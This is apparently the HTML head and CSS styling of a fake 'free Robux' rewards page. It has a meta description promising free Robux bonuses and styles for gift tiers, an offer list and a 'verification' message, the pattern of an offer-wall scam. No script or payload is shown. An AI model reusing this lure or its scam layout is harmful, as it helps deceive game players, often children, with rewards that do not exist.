<head>

  <meta name="description" content="Unlock exclusive Robux rewards today! Join thousands of Roblox players claiming their free bonuses.">
  <link rel="preconnect" href="https://fonts.googleapis.com">

  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    :root {
      --primary: #FF4655;
      --secondary: #0F1923;
      --accent: #00BBFF;
      --text: #FFFFFF;
      --dark-bg: #1A2A3A;
      --light-bg: rgba(255, 255, 255, 0.1);
      --success: #4CAF50;
      --warning: #FF9800;
      --error: #F44336;
    }
    
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
    }
    
    body {
      background: linear-gradient(135deg, var(--secondary), #1E3A8A);
      font-family: 'Poppins', sans-serif;
      color: var(--text);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      position: relative;
      overflow-x: hidden;
    }
    
    body::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: url('https://tr.rbxcdn.com/94f1e5a8b6e9b0e5e5e5e5e5e5e5e5e5/768/432/Image/Png') no-repeat center center;
      background-size: cover;
      opacity: 0.15;
      z-index: -1;
    }
    
    .container {
      background: rgba(15, 25, 35, 0.9);
      backdrop-filter: blur(10px);
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
      padding: 30px;
      width: 100%;
      max-width: 450px;
      text-align: center;
      position: relative;
      overflow: hidden;
      border: 1px solid rgba(255, 255, 255, 0.1);
      transition: transform 0.3s, box-shadow 0.3s;
    }
    
    .container:hover {
      transform: translateY(-5px);
      box-shadow: 0 15px 35px rgba(0, 0, 0, 0.6);
    }
    
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 20px;
      display: block;
      animation: pulse 2s infinite;
    }
    
    h1 {
      font-size: 28px;
      margin-bottom: 20px;
      color: var(--primary);
      font-weight: 700;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.3);
    }
    
    h2 {
      font-size: 22px;
      margin-bottom: 15px;
      font-weight: 600;
    }
    
    p {
      font-size: 16px;
      margin-bottom: 25px;
      line-height: 1.6;
      opacity: 0.9;
    }
    
    .input-group {
      margin-bottom: 20px;
      text-align: left;
    }
    
    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      font-size: 14px;
      color: var(--accent);
    }
    
    input {
      width: 100%;
      padding: 14px 16px;
      background: rgba(0, 0, 0, 0.3);
      border: 2px solid rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      color: var(--text);
      font-size: 16px;
      transition: all 0.3s;
    }
    
    input:focus {
      outline: none;
      border-color: var(--accent);
      background: rgba(0, 0, 0, 0.5);
    }
    
    input::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }
    
    /* New Device Selection Style */
    .device-selection {
      display: flex;
      justify-content: space-between;
      gap: 10px;
      margin: 20px 0;
    }
    
    .device-option {
      flex: 1;
      background: rgba(0, 0, 0, 0.3);
      border: 2px solid rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      padding: 15px 10px;
      cursor: pointer;
      transition: all 0.3s;
      text-align: center;
    }
    
    .device-option:hover {
      background: rgba(0, 0, 0, 0.5);
    }
    
    .device-option.selected {
      background: rgba(0, 187, 255, 0.2);
      border-color: var(--accent);
      transform: translateY(-3px);
      box-shadow: 0 5px 15px rgba(0, 187, 255, 0.2);
    }
    
    .device-icon {
      font-size: 30px;
      margin-bottom: 10px;
      color: var(--accent);
    }
    
    .device-name {
      font-size: 14px;
      font-weight: 600;
    }
    
    .btn {
      background: linear-gradient(135deg, var(--primary), #FF6B6B);
      color: white;
      border: none;
      padding: 15px 30px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 10px;
      cursor: pointer;
      width: 100%;
      transition: all 0.3s;
      box-shadow: 0 4px 15px rgba(255, 70, 85, 0.4);
      margin-top: 10px;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }
    
    .btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 7px 20px rgba(255, 70, 85, 0.6);
    }
    
    .btn:active {
      transform: translateY(1px);
    }
    
    .hidden {
      display: none;
    }
    
    .loading {
      display: flex;
      flex-direction: column;
      align-items: center;
      margin: 20px 0;
    }
    
    .loading-spinner {
      width: 50px;
      height: 50px;
      border: 4px solid rgba(255, 255, 255, 0.1);
      border-radius: 50%;
      border-top-color: var(--accent);
      animation: spin 1s linear infinite;
      margin-bottom: 15px;
    }
    
    .progress-container {
      width: 100%;
      background: rgba(0, 0, 0, 0.3);
      border-radius: 10px;
      height: 12px;
      margin: 25px 0;
      overflow: hidden;
    }
    
    .progress-bar {
      height: 100%;
      width: 0;
      background: linear-gradient(90deg, var(--primary), var(--accent));
      transition: width 0.5s ease;
      border-radius: 10px;
    }
    
    .gift-grid {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 15px;
      margin: 25px 0;
    }
    
    .gift-option {
      background: rgba(0, 187, 255, 0.1);
      border: 2px solid rgba(0, 187, 255, 0.2);
      border-radius: 12px;
      padding: 20px 15px;
      cursor: pointer;
      transition: all 0.3s;
      position: relative;
      overflow: hidden;
    }
    
    .gift-option:hover {
      transform: translateY(-5px);
      background: rgba(0, 187, 255, 0.2);
      box-shadow: 0 5px 15px rgba(0, 187, 255, 0.2);
    }
    
    .gift-option.selected {
      background: rgba(0, 187, 255, 0.3);
      border-color: var(--accent);
      box-shadow: 0 0 0 3px rgba(0, 187, 255, 0.3);
    }
    
    .gift-amount {
      font-size: 24px;
      font-weight: 700;
      color: var(--accent);
      margin-bottom: 5px;
    }
    
    .gift-label {
      font-size: 14px;
      opacity: 0.8;
    }
    
    .verification-message {
      background: rgba(255, 255, 255, 0.1);
      border-left: 4px solid var(--accent);
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
      text-align: left;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .verification-message i {
      font-size: 24px;
      color: var(--accent);
    }
    
    .offer-container {
      margin-top: 25px;
    }
    
    .offer {
      background: rgba(255, 255, 255, 0.05);
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 15px;
      display: flex;
      align-items: center;
      gap: 15px;
      transition: all 0.3s;
    }
    
    .offer:hover {
      background: rgba(255, 255, 255, 0.1);
      transform: translateX(5px);
    }
    
    .offer-icon {
      font-size: 24px;
      color: var(--primary);
      min-width: 40px;
      text-align: center;
    }
    
    .offer-content {
      flex: 1;
      text-align: left;
    }
    
    .offer-title {
      font-weight: 600;
      margin-bottom: 5px;
    }
    
    .offer-desc {
      font-size: 14px;
      opacity: 0.8;
    }
    
    .offer-btn {
      background: var(--primary);
      color: white;
      border: none;
      padding: 8px 15px;
      border-radius: 6px;
      font-size: 14px;
      cursor: pointer;
      transition: all 0.3s;
      white-space: nowrap;
    }
    
    .offer-btn:hover {
      background: #E03A4A;
    }
    
    .security-alert {
      background: rgba(255, 152, 0, 0.1);
      border-left: 4px solid var(--warning);
      padding: 15px;
      border-radius: 8px;
      margin: 20px 0;
      display: flex;
      align-items: center;
      gap: 10px;
    }
    
    .security-alert i {
      font-size: 24px;
      color: var(--warning);
    }
    
    .success-message {
      text-align: center;
      padding: 20px;
    }
    
    .success-icon {
      font-size: 60px;
      color: var(--success);
      margin-bottom: 15px;
      animation: bounce 1s;
    }
    
    @keyframes spin {
      to { transform: rotate(360deg); }
    }
    
    @keyframes pulse {
      0% { transform: scale(1); }
      50% { transform: scale(1.05); }
      100% { transform: scale(1); }
    }
    
    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
      40% { transform: translateY(-20px); }
      60% { transform: translateY(-10px); }
    }
